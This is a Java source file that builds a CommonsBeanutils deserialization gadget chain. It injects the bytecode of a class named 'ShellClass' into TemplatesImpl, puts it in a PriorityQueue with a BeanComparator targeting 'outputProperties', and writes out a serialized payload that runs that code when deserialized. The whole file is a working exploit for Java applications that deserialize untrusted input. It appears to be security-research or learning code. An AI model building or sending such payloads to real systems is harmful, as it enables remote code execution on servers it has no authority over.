package Seri.CBGadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import static Seri.Utils.*;

/*
PriorityQueue.readObject()
    PriorityQueue.heapify()
        PriorityQueue.siftDownUsingComparator()
            BeanComparator.compare()
                TemplatesImpl.getOutputProperties()
 */
public class CommonsBeanutils {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templateimpl = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));

        setValue(templateimpl,"_name","aaa");
        setValue(templateimpl,"_bytecodes",new byte[][] {bytes});
        setValue(templateimpl,"_tfactory",new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator();
//        beanComparator.compare(templateimpl ,templateimpl);
        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");
        setValue(beanComparator ,"property" ,"outputProperties");
        setValue(priorityQueue,"queue",new Object[]{templateimpl,templateimpl});

        serialize(priorityQueue ,"bin/CB2.bin");
        unserialize("bin/CB2.bin");
//        beanComparator.getProperty(new People() ,"age");
//        PropertyUtils.getProperty(new People(),"age");
    }
}
